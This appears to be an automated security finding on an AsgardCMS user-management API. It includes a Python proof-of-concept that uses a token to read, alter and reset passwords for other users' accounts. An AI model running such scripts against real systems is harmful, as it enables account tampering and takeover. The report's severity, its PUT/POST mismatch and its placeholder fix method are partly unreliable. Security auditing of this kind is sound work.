# IDOR Vulnerability Allowing Horizontal Privilege Escalation in User Management

**ID:** vuln-0009
**Severity:** CRITICAL
**Found:** 2026-03-25 06:07:10 UTC
**Target:** /workspace/Platform/Modules/User
**Endpoint:** /api/user/users/{user_id}, /api/user/users/{user_id}/edit, /api/user/users/{user_id}/sendResetPassword
**Method:** GET, POST, PUT, DELETE
**CWE:** CWE-639
**CVSS:** 9.9

## Description

A critical Insecure Direct Object Reference (IDOR) vulnerability was identified in the AsgardCMS User module that allows users with general edit permissions to access and modify data belonging to other users. The vulnerability exists because the API UserController uses route model binding without implementing object-level ownership validation, relying solely on permission-based middleware checks.

The vulnerability was discovered through static code analysis of the User module's API controllers and authorization mechanisms. Despite using 'token-can' middleware for permission validation, the system lacks proper ownership checks to ensure users can only access resources they own.

## Impact

Successful exploitation allows a user with edit permissions to view, modify, or delete any other user's data, including profile information, API keys, and potentially sensitive user data. This represents a critical horizontal privilege escalation vulnerability that compromises user data isolation.

## Technical Analysis

The vulnerability exists in the API UserController methods that use Laravel's route model binding:

1. The find(), findNew(), update(), destroy(), and sendResetPassword() methods accept a User model parameter via route binding
2. The 'token-can:user.users.edit' middleware validates that the user has general edit permissions
3. However, no ownership validation occurs to ensure the authenticated user has rights to the specific user object being accessed

When a user with edit permissions sends requests to endpoints like /api/user/users/{other_user_id}/edit, the system allows the operation because the middleware only checks for the presence of the 'user.users.edit' permission, not whether the user owns the target resource.

## Proof of Concept

To reproduce this vulnerability:

1. Authenticate as User A (with user.users.edit permissions but not admin privileges)
2. Identify User B's ID (can be obtained through enumeration or other means)
3. Send a GET request to /api/user/users/{user_b_id} to retrieve User B's full profile data
4. Send a PUT request to /api/user/users/{user_b_id}/edit to modify User B's information
5. Send a DELETE request to /api/user/users/{user_b_id} to delete User B's account
6. Send a GET request to /api/user/users/{user_b_id}/sendResetPassword to trigger password reset for User B

```
import requests

# Configuration
BASE_URL = "http://localhost:8000"
API_TOKEN = "valid_user_token_with_edit_permissions"  # User with user.users.edit permission
TARGET_USER_ID = "123"  # ID of another user

headers = {
    "Authorization": f"Bearer {API_TOKEN}",
    "Content-Type": "application/json"
}

# Test 1: Retrieve another user's profile
print("Testing IDOR - Retrieving another user's profile...")
response = requests.get(f"{BASE_URL}/api/user/users/{TARGET_USER_ID}", headers=headers)
if response.status_code == 200:
    print("SUCCESS: Retrieved another user's profile")
    print(f"User data: {response.json()}")
else:
    print(f"Failed with status {response.status_code}")

# Test 2: Modify another user's profile
print("\nTesting IDOR - Modifying another user's profile...")
payload = {
    "first_name": "Modified",
    "last_name": "ByAttacker",
    "email": "modified@example.com"
}
response = requests.post(f"{BASE_URL}/api/user/users/{TARGET_USER_ID}/edit", 
                        json=payload, headers=headers)
if response.status_code == 200:
    print("SUCCESS: Modified another user's profile")
else:
    print(f"Failed with status {response.status_code}: {response.text}")

# Test 3: Trigger password reset for another user
print("\nTesting IDOR - Triggering password reset for another user...")
response = requests.get(f"{BASE_URL}/api/user/users/{TARGET_USER_ID}/sendResetPassword", 
                       headers=headers)
if response.status_code == 200:
    print("SUCCESS: Triggered password reset for another user")
else:
    print(f"Failed with status {response.status_code}")
```

## Code Analysis

**Location 1:** `Modules/User/Http/Controllers/Api/UserController.php` (lines 39-42)
  Route model binding without ownership validation
  ```
      public function find(User $user)
    {
        return new FullUserTransformer($user->load('roles'));
    }
  ```

  **Suggested Fix:**
```diff
-     public function find(User $user)
-     {
-         return new FullUserTransformer($user->load('roles'));
-     }
+     public function find(User $user)
+     {
+         // Check if authenticated user has permission to access this specific user
+         if (!auth()->user()->hasPermissionToAccessUser($user)) {
+             abort(403, 'Unauthorized access to user data');
+         }
+         return new FullUserTransformer($user->load('roles'));
+     }
```

## Remediation

1. Implement object-level authorization checks in all UserController methods using route model binding
2. Add ownership validation before allowing operations on user objects
3. Create an authorization policy that checks if the authenticated user owns the target user resource
4. Update the middleware to include both permission and ownership validation
5. Consider implementing resource-based authorization patterns throughout the application
